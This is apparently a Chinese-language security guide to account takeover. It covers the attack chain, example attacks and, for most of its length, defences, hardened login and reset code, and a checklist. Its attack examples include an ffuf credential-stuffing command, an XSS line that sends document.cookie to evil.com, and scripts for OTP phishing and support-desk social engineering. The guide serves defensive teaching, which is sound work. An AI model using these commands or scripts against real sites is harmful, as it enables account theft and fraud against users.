# 账号接管 (Account Takeover, ATO)

> 分类：身份攻击 | 风险：严重 | CWE-287 / CWE-522 / CWE-640 | 攻击链：凭据访问 → 持久化

## 1. 攻击原理

账号接管是**结果**而非单一漏洞：攻击者通过任一途径获得账号控制权，然后持久化并变现。它通常是钓鱼、撞库、会话窃取、密码重置缺陷、客服社工等上游手段的汇聚点。

完整链条：

```text
① 获取凭据/会话  →  ② 通过认证  →  ③ 持久化  →  ④ 变现/横向
```

| 阶段 | 常见手段 |
|---|---|
| ① 获取 | 钓鱼、撞库、泄露库、恶意软件、XSS 窃取、Wi-Fi/中间人、日志泄露、源码泄露 |
| ② 通过 | 密码喷洒、OTP 转发、MFA 疲劳轰炸、会话 Cookie 导入、OAuth Token 窃取 |
| ③ 持久化 | 改绑邮箱/手机、添加自己的 MFA、创建 API Key、添加 OAuth 应用、开启邮件转发规则、添加恢复码 |
| ④ 变现 | 转账、盗刷、导出数据、发垃圾信息、勒索、作为跳板进入企业内网 |

高危设计缺陷：

- 会话 Token 可被重放（无设备绑定、无轮换、登出后不失效）
- 密码/邮箱变更流程仅需旧密码或仅需邮件确认
- 找回密码 Token 可预测、不过期、可重用
- 客服可通过「知道生日/订单号」重置账号
- MFA 可被轻易关闭或替换，无需二次验证
- 无异地/新设备提示，用户与平台都不知情

## 2. 攻击示例

### 2.1 撞库 + 无 MFA

```bash
# 用泄露的 邮箱:密码 组合批量尝试
ffuf -u https://site.com/api/login -X POST \
  -H 'Content-Type: application/json' \
  -d '{"email":"FUZZ1","password":"FUZZ2"}' \
  -w combos.txt -mc 200 -fr 'invalid'
```

成功率低但量大，命中即可接管；同一密码在其他站点复用时危害放大。

### 2.2 会话 Cookie 窃取后导入

```js
// 受害者站点的 XSS（或恶意扩展）
fetch('https://evil.com/c?d=' + document.cookie);
```

攻击者用开发者工具/插件把 Cookie 写入自己浏览器：

```text
document.cookie = "sid=<stolen>; domain=.site.com; path=/";
```

若服务端无设备绑定、会话长期有效 → 直接进入，且**不需要密码与 MFA**。

### 2.3 OTP 转发钓鱼

```text
1. 攻击者在真实站点用受害者邮箱发起登录 → 触发 OTP
2. 攻击者伪装客服：「为核实身份，请把收到的 6 位码告诉我」
3. 受害者报码 → 攻击者完成登录
```

### 2.4 MFA 疲劳轰炸（MFA Fatigue）

连续推送几十次登录批准，受害者不堪其扰点「同意」；或配合「IT 支持」电话施压。

### 2.5 密码重置流程缺陷

```http
POST /api/password/forgot
{ "email": "victim@x.com" }
```

若 Token 为 `md5(email)`、或永不过期、或校验后可重复使用 → 直接接管。

更隐蔽：Host 头注入让重置链接指向攻击者域名（见 `36-host-header-injection`）。

### 2.6 客服社工

```text
攻击者：「我换手机了，收不到验证码，麻烦帮我解绑 MFA。我的订单号是 12345，生日 1990-01-01。」
客服：……（基于公开信息放行）
```

### 2.7 OAuth / 第三方应用

诱导用户授权恶意应用，获得长期 `refresh_token`；即使用户改密码，Token 仍有效。

## 3. 影响

- 单个用户：资金损失、隐私泄露、社交关系被利用二次钓鱼
- 管理员账号：全站数据与配置失守
- 企业：BEC 转账、客户数据泄露、勒索软件入口
- 平台：批量 ATO 会造成信任危机与监管处罚

## 4. 防御措施

### 4.1 认证与凭据

1. **抗钓鱼 MFA**：Passkey / WebAuthn / FIDO2 优先；短信 OTP 仅作降级。
2. **登录风控**：新设备、异地、异常 ASN、无头浏览器、短时间多账号同 IP → 挑战或阻断。
3. **泄露凭据检测**：登录时比对 HIBP（k-anonymity），命中则强制改密并告警。
4. **限流与锁定**：IP / 账号 / 组合三维限流（见 `14-brute-force`）。
5. **密码策略**：长度优先、禁止弱口令、不强制周期更换（NIST）。

### 4.2 会话

6. **登录后轮换 Session ID**（见 `16-session-fixation`）。
7. **会话绑定**：绑定设备指纹 / 大致地域，异常时重认证。
8. **服务端可吊销**：`tokenVersion` 或 `jti` 黑名单；改密、改邮箱、登出全设备后立即失效。
9. **短时效 + Refresh 轮换**：Refresh Token 一次性，检测重用即撤销整个家族。

### 4.3 敏感操作与恢复

10. **敏感变更二次验证**：改密、改邮箱、绑卡、关 MFA、加 API Key 均需**当前密码 + MFA**。
11. **变更通知与延迟生效**：改邮箱/手机后向**旧联系方式**发通知，并设置 24–72 小时冷静期。
12. **找回密码**：高熵一次性 Token、15–30 分钟过期、绑定用户与请求上下文、使用后立即失效。
13. **客服流程**：身份核验使用非公开信息 + 回拨注册号码 + 工单双人复核；禁止仅凭订单号/生日重置。
14. **MFA 管理**：关闭或替换 MFA 需原有 MFA 确认；保留一次性恢复码并提示离线保存。
15. **API Key / OAuth 治理**：可见、可吊销、最小 scope、定期审计；Refresh Token 轮换。

### 4.4 检测与响应

16. **用户可见的登录记录**：设备、地点、时间，支持「不是我」一键踢出。
17. **异常行为检测**：登录后立即改密/改邮箱/导出数据/大额转账 → 高风险评分与拦截。
18. **告警**：同 IP 多账号登录成功、单账号多地并发、批量密码重置。
19. **响应预案**：冻结账号、吊销全部会话与 Token、通知用户、排查横向影响。

## 5. 代码对比

```js
// ✅ 登录风控 + 会话轮换
app.post('/login', async (req, res) => {
  const { email, password } = LoginSchema.parse(req.body);

  if (!(await limiter.consume(`ip:${req.ip}`)) || !(await limiter.consume(`acc:${email}`))) {
    return res.status(429).json({ error: 'too many attempts' });
  }

  const user = await User.findOne({ email });
  const ok = user ? await argon2.verify(user.passwordHash, password) : await fakeVerify();
  if (!ok) return res.status(401).json({ error: 'invalid credentials' });

  const risk = await assessRisk({ user, ip: req.ip, ua: req.get('user-agent') });
  if (risk.level === 'high') return res.status(403).json({ error: 'verification required', challenge: risk.challenge });
  if (risk.level === 'medium') await notifyNewDevice(user, req);

  req.session.regenerate(() => {
    req.session.userId = user.id;
    req.session.deviceId = fingerprint(req);
    req.session.save(() => res.json({ ok: true }));
  });
});
```

```js
// ✅ 服务端可吊销：tokenVersion
app.post('/account/change-email', auth, async (req, res) => {
  const { newEmail, password, otp } = ChangeEmailSchema.parse(req.body);

  if (!(await argon2.verify(req.user.passwordHash, password))) return res.status(403).end();
  if (!(await verifyOtp(req.user.id, otp))) return res.status(403).end();

  await EmailChange.create({
    userId: req.user.id,
    newEmail,
    token: await randomToken(),
    expiresAt: addMinutes(new Date(), 30),
  });

  await notifyOldEmail(req.user, newEmail);          // 旧邮箱通知
  await notifyNewEmail(req.user, newEmail);          // 新邮箱确认
  res.json({ status: 'pending_confirmation', coolDownHours: 48 });
});

// 全设备登出 / 改密后
await User.update({ tokenVersion: { [Op.increment]: 1 } }, { where: { id: req.user.id } });
```

```js
// ✅ 登录后的敏感行为评分
const HIGH_RISK_ACTIONS = new Set(['password.change', 'email.change', 'mfa.disable', 'apikey.create', 'data.export']);
if (HIGH_RISK_ACTIONS.has(action) && minutesSince(loginAt) < 10) {
  await requireStepUpAuth(req);   // 重新验证，不只是已登录
}
```

```js
// ✅ 重置 Token：高熵 + 一次性 + 短时效
const raw = crypto.randomBytes(32).toString('base64url');
const hash = crypto.createHash('sha256').update(raw).digest('hex');
await ResetToken.create({ userId, tokenHash: hash, expiresAt: addMinutes(new Date(), 30) });

// 校验时原子消费
const row = await ResetToken.findOne({ tokenHash: hash, usedAt: null, expiresAt: { [Op.gt]: new Date() } });
if (!row) return res.status(400).json({ error: 'invalid or expired' });
await ResetToken.update({ usedAt: new Date() }, { where: { id: row.id, usedAt: null } });
```

```js
// ✅ 登录记录
await LoginEvent.create({ userId, ip: req.ip, ua, city, deviceId, result: 'success' });
await sendLoginNotice(user, { ip: req.ip, city, time: new Date() });
```

## 6. 自查清单

- [ ] 高权限账号强制抗钓鱼 MFA（Passkey/硬件密钥）
- [ ] 登录有 IP/账号/组合限流与风险评分
- [ ] 命中泄露密码库时强制改密
- [ ] 登录后 Session ID 轮换，会话绑定设备
- [ ] 改密/改邮箱/关 MFA 需密码 + MFA 双确认
- [ ] 联系方式变更通知旧渠道并设冷静期
- [ ] 重置 Token 高熵、一次性、短时效
- [ ] 客服核验流程不依赖公开信息，有双人复核
- [ ] 全设备登出、tokenVersion 吊销可即时生效
- [ ] API Key / OAuth 应用可见、可吊销、定期审计
- [ ] 用户可查看登录记录并踢出设备
- [ ] 异常行为（登录后立即改密/导出/转账）有拦截与告警
- [ ] 有账号接管响应预案并演练

## 7. 参考资料

- OWASP: Credential Stuffing Prevention Cheat Sheet
- OWASP: Forgot Password Cheat Sheet
- OWASP: Session Management Cheat Sheet
- CWE-287 / CWE-522 / CWE-640
- NIST SP 800-63B（AAL2/AAL3）
- MITRE ATT&CK: T1078 Valid Accounts / T1539 Steal Web Session Cookie
